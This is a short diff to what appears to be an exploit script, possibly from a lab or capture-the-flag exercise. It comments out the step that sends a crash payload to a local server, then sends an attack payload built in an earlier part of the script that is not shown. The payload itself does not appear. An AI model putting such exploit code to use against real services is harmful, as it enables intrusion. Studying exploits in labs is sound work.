@@ -119,7 +119,7 @@ sc1_exploit += b"\r\n\r\n"
 
 
 ### PERFORM ATTACK ###
-remote("localhost", port).send(crash) # send crash payload
+# remote("localhost", port).send(crash) # send crash payload
 sleep(2) # let the server restart
 remote("localhost", port).send(sc1_exploit) # send attack payload
 
